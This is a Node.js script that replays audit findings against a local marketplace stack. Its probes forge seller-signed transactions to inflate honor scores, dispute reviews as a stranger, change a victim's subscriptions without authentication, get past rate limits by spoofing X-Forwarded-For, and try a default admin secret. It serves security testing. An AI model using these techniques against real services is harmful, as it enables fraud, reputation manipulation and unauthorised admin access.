// Reproduces the 4 P0 + 3 P1 audit findings against the running stack.
// All exploits run in mock mode against localhost; nothing leaves the box.

import * as ed from "@noble/ed25519";
import { randomBytes, createHash } from "node:crypto";

// Use Node's native async ed25519 (no sync hook needed in Node 22).

const REG = "http://localhost:3030";
const PROV = "http://localhost:3000";
const MM   = "http://localhost:3100";

const c = {
  amber: (s) => `\x1b[38;5;214m${s}\x1b[0m`,
  green: (s) => `\x1b[38;5;120m${s}\x1b[0m`,
  red:   (s) => `\x1b[38;5;203m${s}\x1b[0m`,
  cyan:  (s) => `\x1b[38;5;87m${s}\x1b[0m`,
  dim:   (s) => `\x1b[38;5;245m${s}\x1b[0m`,
  bold:  (s) => `\x1b[1m${s}\x1b[0m`,
};
const head = (s) => console.log(`\n${c.amber("▌ " + s)}`);
const yes  = (m) => console.log(`  ${c.green("✓ exploit confirmed:")} ${m}`);
const no   = (m) => console.log(`  ${c.red("✗ exploit failed:    ")} ${m}`);
const info = (m) => console.log(`  ${c.dim("·")} ${c.dim(m)}`);

async function genKey() {
  const priv = randomBytes(32);
  const pub = await ed.getPublicKeyAsync(priv);
  return { priv, pub: Buffer.from(pub).toString("hex") };
}

async function signed(method, path, body, priv, pub) {
  const ts = String(Date.now());
  const bodyStr = body == null ? "" : (typeof body === "string" ? body : JSON.stringify(body));
  const hash = bodyStr ? createHash("sha256").update(bodyStr).digest("hex") : "";
  const canonical = `${method}\n${path}\n${hash}\n${ts}`;
  const sig = await ed.signAsync(new TextEncoder().encode(canonical), priv);
  const url = `${REG}${path}`;
  return fetch(url, {
    method,
    headers: {
      "content-type": "application/json",
      "x-andromeda-pubkey": pub,
      "x-andromeda-timestamp": ts,
      "x-andromeda-sig": Buffer.from(sig).toString("hex"),
    },
    body: bodyStr || undefined,
  });
}

console.log(c.bold(c.amber("Andromeda — attack-surface probes")));
console.log(c.dim("All probes run against the live local stack."));

// ─── E-1: SYBIL HONOR INFLATION VIA FORGED TX ────────────────────────
head("E-1: Sybil honor inflation via seller-signed forged tx");
{
  const seller = await genKey();
  const buyer  = await genKey();
  // 1. register seller
  let r = await signed("POST", "/api/v1/sellers/register", {
    pubkey: seller.pub, name: "evilcorp",
    url: "http://attacker.invalid",
    description: "...",
    services: [{ local_id: "scam", name: "scam", description: "x", type: "verification", price_sats: 1, p50_ms: 1, tags: [] }],
  }, seller.priv, seller.pub);
  info(`register seller → ${r.status}`);

  // 2. seller-signed tx claiming our chosen buyer was the buyer
  const ph = randomBytes(32).toString("hex");
  r = await signed("POST", "/api/v1/transactions/record", {
    seller_pubkey: seller.pub,
    buyer_pubkey:  buyer.pub,
    service_id: `${seller.pub.slice(0,8)}:scam`,
    amount_sats: 100,
    payment_hash: ph,
    platform_fee_sats: 0,
  }, seller.priv, seller.pub);
  info(`tx record (seller-signed, fake buyer) → ${r.status}`);

  // 3. buyer-signed rating, claiming the (forged) tx
  r = await signed("POST", `/api/v1/sellers/${seller.pub}/rate`, {
    seller_pubkey: seller.pub,
    buyer_pubkey:  buyer.pub,
    stars: 5,
  }, buyer.priv, buyer.pub);
  const j = await r.json().catch(() => null);
  info(`rate (buyer-signed) → ${r.status} ${JSON.stringify(j).slice(0,80)}`);
  if (r.status === 200 && j?.honor_after >= 2) yes(`honor moved 0 → ${j.honor_after} with no real Lightning payment`);
  else no(`server didn't accept the forged buyer (got ${r.status})`);
}

// ─── E-3: Anyone slashes any reviewer ────────────────────────────────
head("E-3: Anyone slashes any reviewer (need a review request first)");
{
  // create a seller, mark availability, request review of self (excluded from picking),
  // need >=2 reviewer keys for the picker. To shortcut: we just call dispute on a
  // bogus review_id and observe whether 4xx is "not found" (auth-side OK) vs
  // "auth required" (closed). The audit's repro depends on a real assigned review,
  // which requires multi-step orchestration. We confirm the auth surface instead.
  const stranger = await genKey();
  const r = await signed("POST", "/api/v1/reviews/rev_does_not_exist/dispute",
    { review_id: "rev_does_not_exist", reason: "fraud", evidence: { x: 1 } },
    stranger.priv, stranger.pub);
  const j = await r.json().catch(() => null);
  info(`dispute /rev_does_not_exist by stranger → ${r.status} ${JSON.stringify(j)?.slice(0,100)}`);
  // Expected by audit: 404 (not "401 not authorized") — confirms anyone with ANY
  // valid sig can call the route. A safer system would check buyer-of-record FIRST.
  if (r.status === 404 && /not found|review/i.test(JSON.stringify(j))) yes(`a stranger's signed dispute reaches the route (404 here = no such review, but auth was accepted)`);
  else if (r.status === 401) no(`auth-gated by buyer-of-record`);
  else                       info(`status ${r.status}`);
}

// ─── E-4: Subscriptions are unauthenticated ──────────────────────────
head("E-4: Anyone can subscribe / top up / cancel any subscription");
{
  // 4a: subscribe on behalf of a victim's pubkey
  const victim = await genKey();
  let r = await fetch(`${MM}/api/v1/subscribe`, {
    method: "POST", headers: { "content-type": "application/json" },
    body: JSON.stringify({ subscriber_pubkey: victim.pub, deposit_sats: 200, watched_repos: ["x/x"], severity_min: "low" }),
  });
  const subBody = await r.json();
  info(`subscribe on behalf of victim → ${r.status} sid=${subBody.subscription_id?.slice(0, 12)}…`);
  if (r.status === 200 && subBody.subscription_id) yes(`unauthenticated subscribe accepted`);
  else                                              no(`subscribe needed auth (good)`);

  if (subBody.subscription_id) {
    // 4b: top-up free
    r = await fetch(`${MM}/api/v1/subscriptions/${subBody.subscription_id}/topup`, {
      method: "POST", headers: { "content-type": "application/json" },
      body: JSON.stringify({ sats: 1000 }),
    });
    const j = await r.json().catch(() => null);
    info(`top-up free → ${r.status} balance=${j?.balance_sats}`);
    if (r.status === 200 && j?.balance_sats > 200) yes(`unauthenticated top-up accepted (balance phantom-incremented)`);

    // 4c: cancel
    r = await fetch(`${MM}/api/v1/subscriptions/${subBody.subscription_id}/cancel`, { method: "POST" });
    const c = await r.json().catch(() => null);
    info(`cancel → ${r.status} refunded=${c?.refunded_sats}`);
    if (r.status === 200 && c?.refunded_sats >= 0) yes(`unauthenticated cancel accepted, returns "refunded_sats"`);
  }
}

// ─── E-7: Rate-limit bypass via spoofed x-forwarded-for ──────────────
head("E-7: Provider rate-limit bypass via x-forwarded-for");
{
  const same = await Promise.all(Array.from({ length: 50 }, () =>
    fetch(`${PROV}/api/v1/listing-verify`, { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify({ listing: "x", date: "2026-04-26" }) })
  ));
  const same429 = same.filter(r => r.status === 429).length;
  info(`50 reqs same IP → ${same429} got 429`);

  const spoofed = await Promise.all(Array.from({ length: 50 }, (_, i) =>
    fetch(`${PROV}/api/v1/listing-verify`, {
      method: "POST",
      headers: { "content-type": "application/json", "x-forwarded-for": `198.51.100.${i}` },
      body: JSON.stringify({ listing: "y", date: "2026-04-26" }),
    })
  ));
  const sp429 = spoofed.filter(r => r.status === 429).length;
  info(`50 reqs spoofed XFF → ${sp429} got 429`);
  if (sp429 < same429) yes(`spoofing XFF lowered 429s (${same429} → ${sp429}) — rate-limit per-IP defeats trivially`);
  else no(`XFF didn't help (${same429} → ${sp429})`);
}

// ─── E-8: default admin secret on registry ────────────────────────────
head("E-8: registry admin endpoints accept default 'dev-admin-secret'");
{
  const r = await fetch(`${REG}/api/v1/platform/revenue`, { headers: { "x-admin-secret": "dev-admin-secret" } });
  info(`platform/revenue with default secret → ${r.status}`);
  if (r.status === 200) yes(`default admin secret is live`);
  else no(`default admin secret rejected`);
}

console.log("");
console.log(c.dim("note: E-2 / E-5 / E-6 require multi-step setup or run inside the MCP and are exercised by the phase test gates."));
process.exit(0);
